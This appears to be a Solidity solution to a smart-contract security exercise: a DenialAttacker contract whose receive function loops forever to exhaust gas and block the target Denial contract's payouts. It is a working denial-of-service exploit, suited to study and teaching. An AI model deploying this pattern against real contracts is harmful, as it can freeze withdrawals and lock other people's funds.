// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "week8-9-security/Denial.sol";

contract DenialAttacker {
    Denial denial;

    constructor(Denial denial_) {
        denial = denial_;
    }

    receive() external payable {
        // Use up all the gas in order to halt the contract
        while (true) {}
    }
}
